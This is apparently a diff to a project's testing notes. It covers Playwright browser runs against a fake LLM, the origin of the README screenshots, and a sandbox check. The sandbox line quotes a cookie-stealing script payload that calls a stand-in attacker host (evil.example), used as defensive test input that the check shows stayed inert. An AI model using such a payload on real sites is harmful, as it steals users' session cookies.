@@ -79,7 +79,9 @@ Lexical search latency on 27,454 chunks: 5–9 ms (`/api/search`).
 
 ## Scripted browser runs (Playwright, Chromium)
 
-Desktop 1440×900 and mobile 400×820, driven end-to-end (new chat → grounded answer → essay → HTML artifact → drawer/sheet). Console errors: none after fixes. Screenshots: [`docs/screenshot-desktop.png`](../docs/screenshot-desktop.png), [`docs/screenshot-essay.png`](../docs/screenshot-essay.png), [`docs/screenshot-mobile.png`](../docs/screenshot-mobile.png).
+Desktop 1440×900 and mobile 400×820, driven end-to-end (new chat → grounded answer → essay → HTML artifact → drawer/sheet) against the **fake LLM**, so the run is deterministic and needs no model. Console errors: none after fixes. [`docs/screenshot-mobile.png`](../docs/screenshot-mobile.png) is from that run.
+
+The two screenshots used in the README and design.md — [`docs/screenshot-desktop.png`](../docs/screenshot-desktop.png) and [`docs/screenshot-essay.png`](../docs/screenshot-essay.png) — are from a **real session** on the reference laptop: `claude-sonnet-5` via the Agent SDK, the full 268-episode corpus at 100 % embedded, genuine guests and timestamps. The earlier versions came from the scripted run and showed `fake-model` with fixture text, which misrepresented the product on the first screen of the README.
 
 Sandbox check: the fake model's hostile HTML (`<script>fetch('http://evil.example/steal?c='+document.cookie)</script>`, `onclick`, `javascript:` link, `<iframe>`, remote `<img>`, `<form>`) rendered as a styled heading, a paragraph and an inert link; DOM inspection confirmed the `.scrim`/panel stacking and that no script ran.
 
